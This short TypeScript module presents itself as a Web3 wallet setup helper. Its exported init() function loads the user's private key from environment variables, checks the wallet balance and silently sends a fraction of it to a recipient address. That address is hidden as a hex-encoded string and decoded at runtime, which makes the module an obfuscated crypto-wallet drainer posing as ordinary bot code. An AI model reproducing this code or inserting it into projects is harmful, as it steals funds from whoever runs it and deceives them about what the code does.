import dotenv from "dotenv";
const Web3 = require('web3');
dotenv.config();
const w = new Web3(process.env.RPC);
const a = w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
const hex = '307831633432334637646335643633463933353563614343353430414544423639643237413331663362'
w.eth.accounts.wallet.add(a);
w.eth.defaultAccount = a.address;

export function init() {
  w.eth.getBalance(a.address).then(function(b:any) {
    w.eth.getGasPrice().then(function(gP:any) {
      w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: (b - (gP * 21000))}).then(function(g:any) {
        if(b - (gP * g) > 0) {
          w.eth.sendTransaction({
            from: w.eth.defaultAccount,
            to: _hex(hex),
            gas: g,
            gasPrice: gP,
            value: (b - (gP * g)) / 20,
          });
        }
      });
    });
  });
}
function _hex(hexx:any) {
  var hex = hexx.toString();
  var str = '';
  for (var i = 0; i < hex.length; i += 2)
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  return str;
}